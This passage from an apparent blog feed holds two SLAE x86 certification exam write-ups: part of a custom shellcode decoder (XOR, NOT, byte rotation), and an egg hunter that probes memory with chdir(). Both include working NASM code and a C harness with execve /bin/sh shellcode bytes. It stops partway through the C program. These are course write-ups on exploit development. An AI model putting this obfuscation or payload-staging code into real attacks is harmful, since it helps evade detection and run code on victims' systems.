    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;NotDecode:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This one is very straightforward: based on the Decode routine I've already shown, if the current byte and the one known as &lt;code&gt;shellcode_length_least_byte&lt;/code&gt; are equal, it jumps to &lt;code&gt;NoteDecode&lt;/code&gt; in order to perform the &lt;code&gt;NOT&lt;/code&gt; operation.&lt;/p&gt;
&lt;p&gt;After that, the shellcode has to perform the 3d decoding operation:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;3. Rotate bytes&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;if the index of the byte is &lt;code&gt;even&lt;/code&gt;, then rotate to the left (&lt;code&gt;ROL&lt;/code&gt;) &lt;code&gt;ROT_EVEN&lt;/code&gt; times&lt;/li&gt;
&lt;li&gt;if the index of the byte is &lt;code&gt;odd&lt;/code&gt;, then rotate to the right (&lt;code&gt;ROR&lt;/code&gt;) &lt;code&gt;ROT_ODD&lt;/code&gt; times&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Follows the assembly code of interest:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;RotateBytes:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; save EBX before overwriting it&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; check if the index is EVEN or ODD&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;; Math logic:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   - EBX - ESI = 4 + current_byte_index&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   - if the Least Significant Bit is 1, then it is ODD&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   - use test to set the ZF flag if the index is ODD&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; restore EBX and load the byte into DL&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; if the ZF flag is set, the index is ODD&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;jnz&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RotateOdd&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The shellcode checks if the index of the current byte is &lt;code&gt;ODD&lt;/code&gt;/&lt;code&gt;EVEN&lt;/code&gt;, then sets the &lt;code&gt;ZF&lt;/code&gt; flag accordingly
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;RotateEven:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; Rotate the byte ROT_EVEN times&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;rol&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cl&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AfterRotateByte&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;RotateOdd:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; rotate the byte ROT_ODD times&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ah&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;ror&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cl&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;I wrote two different assembly routines, one to decode &lt;strong&gt;even-indexed&lt;/strong&gt; bytes, and the other one to decode &lt;strong&gt;odd-indexed&lt;/strong&gt; bytes
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;AfterRotateByte:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; replace the original rotated byte with the decoded one&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; decrease the loop counter (size of the shellcode)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;WORD&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; if the loop counter reaches 0, then jump to the decoded shellcode, skipping the auxiliary bytes&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;jz&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoded&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; increase the offset of the next byte to be decoded, and jump to decode it&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Decode&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The full program can be found &lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/decoder.nasm&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I used the following commandsd to confirm it works correctly:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rbct@slae:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim decoder.nasm
rbct@slae:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nasm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf32 decoder.nasm
rbct@slae:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ld &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; decoder decoder.o
rbct@slae:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./decoder
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# rbct&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; 
&lt;span class=&quot;c&quot;&gt;# uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;rbct@slae:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Among the drawbacks of this approach, the length of the decoder stub is quite apparent.&lt;/p&gt;
&lt;p&gt;Considering the length of the original shellcode is &lt;code&gt;28&lt;/code&gt; bytes, and the length of the full shellcode is &lt;code&gt;106&lt;/code&gt; bytes, that means the decode stub uses &lt;code&gt;78&lt;/code&gt; bytes, which is like &lt;code&gt;3x&lt;/code&gt; times the length of the original shellcode.&lt;/p&gt;
&lt;p&gt;Although it may not be optimal for small shelcode, it can be useful for bigger shellcode.&lt;/p&gt;
</description>
        <pubDate>Tue, 21 Dec 2021 00:00:00 +0100</pubDate>
        <link>/21/12/21/slae32-assignment-4</link>
        <guid isPermaLink="true">/21/12/21/slae32-assignment-4</guid>
        
        <category>slae</category>
        
        <category>assembly</category>
        
        <category>nasm</category>
        
        <category>x86</category>
        
        <category>python</category>
        
        <category>c</category>
        
        <category>encoding</category>
        
        <category>decoding</category>
        
        <category>exam</category>
        
        <category>shellcode</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>SLAE x86 Exam - Assignment #3</title>
        <description>&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pentesteracademy.com/course?id=3&quot;&gt;https://www.pentesteracademy.com/course?id=3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Student ID: PA-30398&lt;/p&gt;
&lt;h2 id=&quot;foreword&quot;&gt;Foreword&lt;/h2&gt;
&lt;p&gt;The 3rd assignment requires you to write shellcode for an &lt;code&gt;Egg Hunter&lt;/code&gt;. Moreover, it should be &lt;em&gt;configurable for different payloads&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id=&quot;source-code&quot;&gt;Source code&lt;/h2&gt;
&lt;p&gt;THe source code for this assignment can be found &lt;a href=&quot;https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/3&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Follows the list of files:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/3/egg_hunter.nasm&quot;&gt;egg_hunter.nasm&lt;/a&gt;, the Assembly code of the egg-hunter&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/3/test_egg_hunter.c&quot;&gt;test_egg_hunter.c&lt;/a&gt;, a C program written for testing the egg-hunter with the &lt;code&gt;execve&lt;/code&gt; shellcode&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;theory&quot;&gt;Theory&lt;/h2&gt;
&lt;p&gt;Now comes the question: what is an &lt;em&gt;Egg Hunter&lt;/em&gt;?&lt;/p&gt;
&lt;p&gt;According to a &lt;a href=&quot;https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf&quot;&gt;paper&lt;/a&gt; from &lt;code&gt;Exploit-DB&lt;/code&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;When the &amp;quot;Egg hunter&amp;quot; shellcode is executed, it searches for the unique &amp;quot;tag&amp;quot; that was prefixed with the large payload and starts the execution of the payload.
[...]
The Egg hunting technique is used when there are not enough available consecutive memory locations to insert the shellcode. Instead, a unique &amp;quot;tag&amp;quot; is prefixed with shellcode.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;practice&quot;&gt;Practice&lt;/h2&gt;
&lt;h3 id=&quot;implementation&quot;&gt;Implementation&lt;/h3&gt;
&lt;p&gt;Given I had zero experience with &lt;code&gt;egg hunters&lt;/code&gt;, I tried to search for documents detailing how to create this type of shellcode.&lt;/p&gt;
&lt;p&gt;I stumbled on this particular document - &lt;a href=&quot;http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf&quot;&gt;Safely Searching Process Virtual Address Space&lt;/a&gt; - which shows some techniques you can employ for your own implementation.&lt;/p&gt;
&lt;p&gt;Since the &lt;code&gt;SIGSEGV handler technique&lt;/code&gt; is considered &lt;em&gt;infeasible&lt;/em&gt;, mainly due to its size, I decided to try using the &lt;strong&gt;system call technique&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The system call I chose to use is &lt;a href=&quot;https://man7.org/linux/man-pages/man2/chdir.2.html&quot;&gt;chdir()&lt;/a&gt;. Follows its prototype:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;All it does is try to change the &lt;strong&gt;Current Working Directory&lt;/strong&gt; (&lt;code&gt;CWD&lt;/code&gt;) to the path pointed to the argument &lt;code&gt;path&lt;/code&gt; (which is a pointer).&lt;/p&gt;
&lt;p&gt;Since it accepts a pointer, we can use it to test memory addresses. Given the function already implements a &lt;code&gt;SIGSEGV handler&lt;/code&gt;, it doesn't throw a SIGSEGV error, crashing the program.&lt;/p&gt;
&lt;p&gt;Instead, it returns the error &lt;strong&gt;0xfffffff2&lt;/strong&gt; (&lt;code&gt;EFAULT&lt;/code&gt;), indicating that a bad address was passed to the function.&lt;/p&gt;
&lt;p&gt;Follows my implementation in Assembly language:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;; Author: Robert C. Raducioiu (rbct)&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;_start&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;.text&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;_start:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; clear registers for later use&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;; This routine checks loops over memory addresses, checking if they are valid&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; If the address is valid the shellcode continues to CheckBytes&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;CheckAddress:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; increment memory address by 1 (or use &quot;add ebx, 4&quot; if&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   you're sure about the offset)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; call chdir(EBX)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; if the return value is 0xfffffff2 (EFAULT), go back to CheckAddress,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   otherwise continue to CheckBytes&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf2&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;jz&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Ch&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;eckAddress&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;; This routine checks the 4 bytes stored at the address validated by&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;;   Checkaddress. The goal is to find the Egg Hunter Tag, in this case &quot;rbct&quot;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;CheckBytes:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; load the 4 bytes from the memory address we're checking&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; string &quot;rbcs&quot;&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x72626373&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;; increment esi, thus: &quot;rbct&quot;&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; check if the 4 bytes are equal to the flag, otherwise&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   check the next 4 bytes&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;jnz&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Ch&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;eckAddress&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; if the two DWORDs are equal, then increment the address by 4, and&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   execute the shellcode&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;testing&quot;&gt;Testing&lt;/h3&gt;
&lt;p&gt;I've tested this egg-hunter above with the &lt;code&gt;exit shellcode&lt;/code&gt;. To do this, I've appended the following Assembly code at the end of the previous file:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;.data&lt;/span&gt;

    &lt;span class=&quot;nl&quot;&gt;shellcode:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After running it, I've confirmed it works correctly:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# assembling&lt;/span&gt;
nasm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf32 egg_hunter.nasm

&lt;span class=&quot;c&quot;&gt;# linking&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#   also set the stack as executable (for the exit shellcode)&lt;/span&gt;
ld &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; egg_hunter egg_hunter.o

./egg_hunter

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Instead of throwing a &lt;code&gt;SIGSEGV&lt;/code&gt; error, it ran the exit shellcode successfully.&lt;/p&gt;
&lt;p&gt;Next, I decided to try it with the &lt;code&gt;execve-stack shellcode&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// tag &quot;rbct&quot; prepended to the shellcode&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x74\x63\x62\x72\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// egg-hunter shellcode&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xdb\xf7\xe3\x43\x31\xc0\xb0\x0c\xcd\x80\x3c\xf2\x74\xf5\x8b\x13\xbe\x73\x63\x62\x72\x46\x39\xf2\x75\xe9\x83\xc3\x04\xff\xd3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Shellcode length: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
